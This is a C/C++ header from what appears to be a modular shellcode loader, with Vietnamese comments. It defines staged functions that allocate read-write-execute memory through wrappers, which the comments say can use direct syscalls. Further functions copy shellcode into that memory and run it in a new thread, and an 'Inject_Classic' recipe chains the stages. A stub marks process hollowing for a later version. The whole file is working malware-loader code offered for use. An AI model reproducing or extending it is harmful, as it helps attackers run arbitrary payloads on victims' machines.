#pragma once

// Include các lớp trừu tượng và tiện ích
#include "api/api_wrappers.h"
#include "core/utils.h"

// --- Debug Macros ---
#ifdef DEBUG_MODE
    #define DEBUG_MSG(title, msg) MessageBoxA(NULL, msg, title, MB_OK | MB_ICONINFORMATION)
#else
    #define DEBUG_MSG(title, msg)
#endif

// =================================================================
//               STAGE 2: ALLOCATION PRIMITIVES
// =================================================================

// [A1] Local Allocation: Cấp phát bộ nhớ trong chính tiến trình
LPVOID Stage2_Allocate_Local(int size) {
    DEBUG_MSG("Stage 2: Allocation", "Requesting local memory (RWX)...");
    
    // Gọi Wrapper (WinAPI hoặc Syscall tùy config)
    // Lưu ý: Wrapper MyVirtualAlloc đã tự xử lý các cờ MEM_COMMIT | PAGE_EXECUTE_READWRITE
    LPVOID mem = MyVirtualAlloc(size);
    
    if (mem == NULL) {
        DEBUG_MSG("Stage 2 [ERROR]", "Memory allocation failed.");
        return NULL;
    }

    return mem;
}

// =================================================================
//               STAGE 3: WRITING PRIMITIVES
// =================================================================

// [W1] Local Writing: Ghi dữ liệu vào bộ nhớ cục bộ
BOOL Stage3_Write_Local(LPVOID dest, unsigned char* src, int len) {
    DEBUG_MSG("Stage 3: Writing", "Copying shellcode to target memory...");
    
    // Sử dụng RtlMoveMemory để tránh phụ thuộc vào thư viện C chuẩn (memcpy)
    RtlMoveMemory(dest, src, len);
    
    DEBUG_MSG("Stage 3: Success", "Payload written successfully.");
    return TRUE;
}

// =================================================================
//               STAGE 4: EXECUTION PRIMITIVES
// =================================================================

// [E1] Local Thread Execution: Tạo luồng mới để chạy shellcode
void Stage4_Execute_Local_Thread(LPVOID address) {
    DEBUG_MSG("Stage 4: Execution", "Triggering payload via CreateThread...");
    
    // Gọi Wrapper MyCreateThread
    HANDLE thread = MyCreateThread(address);
    
    if (thread == NULL) {
        // Nếu thất bại, thử giải phóng bộ nhớ (cần wrapper VirtualFree nếu muốn hoàn hảo)
        // VirtualFree(address, 0, MEM_RELEASE);
        DEBUG_MSG("Stage 4 [ERROR]", "Execution failed (Thread creation error).");
        return;
    }

    // Chờ luồng hoàn thành
    MyWaitForSingleObject(thread);
    
    DEBUG_MSG("Stage 4 [DONE]", "Thread finished execution.");
    
    // Dọn dẹp handle luồng
    CloseHandle(thread);
}

// =================================================================
//               INJECTION RECIPES (CÁC KỸ THUẬT HOÀN CHỈNH)
// =================================================================

/*
 * Technique: Classic Injection
 * Recipe: [Storage] -> A1 -> W1 -> E1
 */
void Inject_Classic(unsigned char* shellcode, int shellcode_len) {
    // 1. Allocation Phase
    LPVOID mem = Stage2_Allocate_Local(shellcode_len);
    if (!mem) return;

    // 2. Writing Phase
    Stage3_Write_Local(mem, shellcode, shellcode_len);

    // 3. Execution Phase
    Stage4_Execute_Local_Thread(mem);
}

/*
 * Technique: Process Hollowing (Placeholder cho tương lai)
 * Recipe: [Storage] -> CreateSuspended -> Unmap -> A2 -> W2 -> E4 -> Resume
 */
// void Inject_ProcessHollowing(...) { ... }